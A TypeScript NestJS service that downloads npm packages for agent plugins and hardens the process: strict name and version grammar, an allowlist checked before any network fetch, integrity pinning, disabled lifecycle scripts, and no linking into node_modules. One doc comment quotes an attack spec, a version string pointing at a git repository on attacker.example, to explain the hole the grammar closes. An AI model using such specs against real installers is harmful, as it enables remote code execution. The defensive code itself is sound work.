import { HttpException, HttpStatus, Injectable, Logger } from '@nestjs/common';
import { mkdir, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { AgentPluginAllowlistService } from './allowlist.service';

/**
 * npm acquirer for Agent Plugins packages.
 *
 * Mirrors `PluginInstallerService` — same `pacote` SDK, same allowlist-first
 * ordering, same 409/424/502/504 vocabulary — with **one deliberate
 * divergence** that must survive future refactors:
 *
 * ## These packages are never linked into `node_modules`
 *
 * The code-plugin installer symlinks each extracted package under
 * `node_modules` so the loader can `await import()` it. An Agent Plugins
 * package must NOT be linked and must NEVER be imported. It is *data* — a
 * manifest, some Markdown skills, an MCP server declaration — and the whole
 * safety argument of the format rests on it never being executable.
 *
 * Linking it would place attacker-supplied code on the module resolution path,
 * where an unrelated `import('some-name')` elsewhere in the process could
 * resolve to it. That converts "we downloaded a document" into "we downloaded
 * and can execute a module", which is the single most valuable escalation
 * available against this feature. The absence of a `symlinkUnderNodeModules`
 * call here is load-bearing, not an omission.
 */

/** Reject absurd versions before they reach the registry. */
const MAX_VERSION_LENGTH = 256;

/**
 * A registry version specifier, and nothing else.
 *
 * `pacote` resolves `<name>@<spec>` through `npm-package-arg`, which decides
 * the TRANSPORT from the spec's shape — not from the caller's intent. A spec
 * of `git+https://host/x.git` yields `type: 'git'`, and pacote's git fetcher
 * then runs `npm install` on the cloned repository whenever its package.json
 * declares `prepare` / `install` / `preinstall` / `postinstall` / `prepack` /
 * `build`. Verified against the installed npm-package-arg 13.0.2:
 *
 *     npa('safe-pkg@git+https://attacker.example/evil.git').type === 'git'
 *
 * The allowlist only ever sees the package NAME, so a name allowlisted for a
 * legitimate plugin was enough to make the API pod clone and execute an
 * arbitrary repository. Restricting the grammar closes that at the entrance:
 * semver-ish characters and dist-tag words only, with no `:`, `/`, `@` or
 * whitespace, so nothing can name a transport.
 */
const NPM_VERSION_SPEC = /^[A-Za-z0-9^~><=*][A-Za-z0-9.+~^><=*\- |]*$/;

/** npm's own name grammar: scoped or unscoped, no path or URL characters. */
const NPM_PACKAGE_NAME = /^(?:@[a-z0-9-*~][a-z0-9-*._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/;

export interface NpmAcquireInput {
    /** The npm package name. */
    packageName: string;
    /** A version or dist-tag. Defaults to `latest`. */
    version?: string;
    /** Directory the package contents are written into. */
    destDir: string;
    /** Registry base URL. Defaults to the public registry. */
    registry?: string;
}

export interface NpmAcquireResult {
    packageName: string;
    version: string;
    integrity: string | null;
    path: string;
}

/** Subset of the pacote API used here, so tests can inject a stub. */
export interface PacoteLike {
    manifest(spec: string, opts?: Record<string, unknown>): Promise<NpmManifest>;
    extract(spec: string, dest: string, opts?: Record<string, unknown>): Promise<unknown>;
}

export interface NpmManifest {
    name?: string;
    version: string;
    _integrity?: string;
    deprecated?: string;
}

export const DEFAULT_NPM_REGISTRY = 'https://registry.npmjs.org/';

/** Where an npm-sourced package is materialised, keyed by name and version. */
export function npmPackageDir(root: string, packageName: string, version: string): string {
    return join(root, 'npm', encodeURIComponent(packageName), version);
}

/**
 * Version ranges here are matched as an exact value or a trailing-`*` prefix,
 * NOT as semver.
 *
 * Semver range matching would be friendlier, but it would also mean an
 * operator writing `^1.0.0` silently authorises versions that do not exist
 * yet — every future 1.x the publisher pushes, including one published after
 * an account compromise. Prefix matching keeps the grant to something the
 * operator can actually enumerate at the time they write it.
 */
export function versionPermitted(version: string, range: string | null | undefined): boolean {
    const pattern = range?.trim();
    if (!pattern || pattern === '*') return true;
    if (pattern.endsWith('*')) return version.startsWith(pattern.slice(0, -1));
    return version === pattern;
}

@Injectable()
export class AgentPluginNpmSource {
    private readonly logger = new Logger(AgentPluginNpmSource.name);
    private pacote: PacoteLike | null = null;

    constructor(private readonly allowlist: AgentPluginAllowlistService) {}

    /** Test-only injection seam, mirroring `PluginInstallerService.setPacote`. */
    setPacote(impl: PacoteLike): void {
        this.pacote = impl;
    }

    async acquire(input: NpmAcquireInput): Promise<NpmAcquireResult> {
        const { packageName } = input;
        const requested = input.version?.trim() || 'latest';

        // Refuse a name or version that could name a TRANSPORT rather than a
        // registry coordinate. This runs before the allowlist because the
        // allowlist checks the NAME, and the attack rides on the VERSION.
        if (!NPM_PACKAGE_NAME.test(packageName)) {
            throw new HttpException(
                {
                    statusCode: HttpStatus.CONFLICT,
                    message: `Refusing "${packageName}": not a valid npm package name.`,
                    packageName,
                },
                HttpStatus.CONFLICT,
            );
        }

        if (!NPM_VERSION_SPEC.test(requested)) {
            throw new HttpException(
                {
                    statusCode: HttpStatus.CONFLICT,
                    message: `Refusing "${packageName}": version specifier must be a registry version, range or dist-tag.`,
                    packageName,
                },
                HttpStatus.CONFLICT,
            );
        }

        if (requested.length > MAX_VERSION_LENGTH) {
            throw new HttpException(
                {
                    statusCode: HttpStatus.CONFLICT,
                    message: `Refusing "${packageName}": version specifier is implausibly long.`,
                    packageName,
                },
                HttpStatus.CONFLICT,
            );
        }

        // Allowlist FIRST — refuse before any network fetch (FR-11). Resolving
        // a manifest for an unauthorised package still contacts the registry
        // and still discloses this deployment's interest in it.
        const allow = await this.allowlist.check(packageName, 'npm');
        if (!allow.allowed) {
            throw new HttpException(
                { statusCode: HttpStatus.CONFLICT, message: allow.reason, packageName },
                HttpStatus.CONFLICT,
            );
        }

        const registry = input.registry || DEFAULT_NPM_REGISTRY;
        const pacote = await this.getPacote(packageName);
        const spec = `${packageName}@${requested}`;

        try {
            const manifest = await pacote.manifest(spec, this.pacoteOptions(registry));

            // The RESOLVED version is checked against the range, not the
            // requested one. A dist-tag such as `latest` carries no version
            // information at request time, so checking the request would let
            // `latest` bypass the range entirely.
            if (!versionPermitted(manifest.version, allow.entry?.versionRange)) {
                throw new HttpException(
                    {
                        statusCode: HttpStatus.CONFLICT,
                        message:
                            `"${packageName}" resolved to ${manifest.version}, which the ` +
                            `allowlist entry does not permit ` +
                            `(allowed: ${allow.entry?.versionRange}).`,
                        packageName,
                    },
                    HttpStatus.CONFLICT,
                );
            }

            // A pinned integrity on the allowlist entry is a hard equality
            // check. 424 (Failed Dependency) matches the code-plugin
            // installer's mapping for "the artefact is not what was promised".
            const pinned = allow.entry?.integrity?.trim();
            if (pinned && manifest._integrity && pinned !== manifest._integrity) {
                throw new HttpException(
                    {
                        statusCode: HttpStatus.FAILED_DEPENDENCY,
                        message:
                            `Integrity mismatch for ${packageName}@${manifest.version}: ` +
                            `the allowlist pins a different artefact than the registry served.`,
                        packageName,
                    },
                    HttpStatus.FAILED_DEPENDENCY,
                );
            }

            if (manifest.deprecated) {
                this.logger.warn(
                    `${packageName}@${manifest.version} is deprecated: ${manifest.deprecated}`,
                );
            }

            await rm(input.destDir, { recursive: true, force: true });
            await mkdir(input.destDir, { recursive: true });

            // `extract` unpacks the tarball and verifies its integrity BEFORE
            // writing. It does not run lifecycle scripts and does not install
            // dependencies — both of which we rely on: a package here is
            // documents, so it has no build step and nothing to install.
            await pacote.extract(`${packageName}@${manifest.version}`, input.destDir, {
                ...this.pacoteOptions(registry),
                ...(manifest._integrity ? { integrity: manifest._integrity } : {}),
            });

            // NOTE: no symlink under node_modules. See the class docstring —
            // that omission is the control that keeps these packages
            // non-executable.

            return {
                packageName,
                version: manifest.version,
                integrity: manifest._integrity ?? null,
                path: input.destDir,
            };
        } catch (err) {
            await rm(input.destDir, { recursive: true, force: true }).catch(() => undefined);
            if (err instanceof HttpException) throw err;

            const reason = err instanceof Error ? err.message : String(err);
            const code = /timeout|ETIMEDOUT/i.test(reason)
                ? HttpStatus.GATEWAY_TIMEOUT
                : HttpStatus.BAD_GATEWAY;
            throw new HttpException({ statusCode: code, message: reason, packageName }, code);
        }
    }

    /**
     * The version the registry would serve right now, without extracting
     * anything — so an update check costs one manifest request and no disk.
     */
    async latestVersion(packageName: string, registry?: string): Promise<string | null> {
        const allow = await this.allowlist.check(packageName, 'npm');
        if (!allow.allowed) return null;
        try {
            const pacote = await this.getPacote(packageName);
            const manifest = await pacote.manifest(
                `${packageName}@latest`,
                this.pacoteOptions(registry || DEFAULT_NPM_REGISTRY),
            );
            return versionPermitted(manifest.version, allow.entry?.versionRange)
                ? manifest.version
                : null;
        } catch (err) {
            // An update CHECK must never break the caller: not knowing whether
            // a newer version exists is a strictly better outcome than failing
            // the page that asked.
            this.logger.debug(
                `Update check failed for ${packageName}: ${
                    err instanceof Error ? err.message : String(err)
                }`,
            );
            return null;
        }
    }

    private pacoteOptions(registry: string): Record<string, unknown> {
        // `ignoreScripts` is defence in depth, not the primary control: the
        // grammar checks above are what keep the spec on the registry
        // transport. If a future change ever lets a git or directory spec
        // through again, this stops it running the package's lifecycle
        // scripts on the API pod rather than merely making it likelier to.
        return { registry, ignoreScripts: true };
    }

    private async getPacote(packageName: string): Promise<PacoteLike> {
        if (this.pacote) return this.pacote;
        try {
            const mod: { default?: PacoteLike } & PacoteLike = await import('pacote');
            const impl = mod.default ?? mod;
            this.pacote = impl;
            return impl;
        } catch {
            throw new HttpException(
                {
                    statusCode: HttpStatus.NOT_IMPLEMENTED,
                    message:
                        `Cannot fetch "${packageName}": the npm source requires the ` +
                        `'pacote' package, which is not installed.`,
                },
                HttpStatus.NOT_IMPLEMENTED,
            );
        }
    }
}
